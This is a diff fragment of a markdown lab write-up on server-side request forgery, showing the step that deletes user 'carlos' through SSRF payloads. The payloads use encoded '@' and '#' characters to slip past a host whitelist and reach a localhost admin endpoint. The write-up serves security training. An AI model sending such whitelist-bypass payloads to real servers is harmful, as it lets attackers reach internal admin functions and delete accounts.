@@ -30,7 +30,7 @@ Server-Side Request Forgery (SSRF) is a web security vulnerability that allows a
 ### 4. Deleting the User
 - **Action**: Modify the `path` parameter to delete the target user:                
 http%3A%2F%2Flocalhost%3a80%2523@stock.weliketoshop.net%3A8080%2Fadmin/delete?username=carlos
-- same command but simpler for human understanding below :
+- same command but simpler for human understanding below :                                    
 http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
 - **Observation**: The user `carlos` is deleted, solving the lab.
 
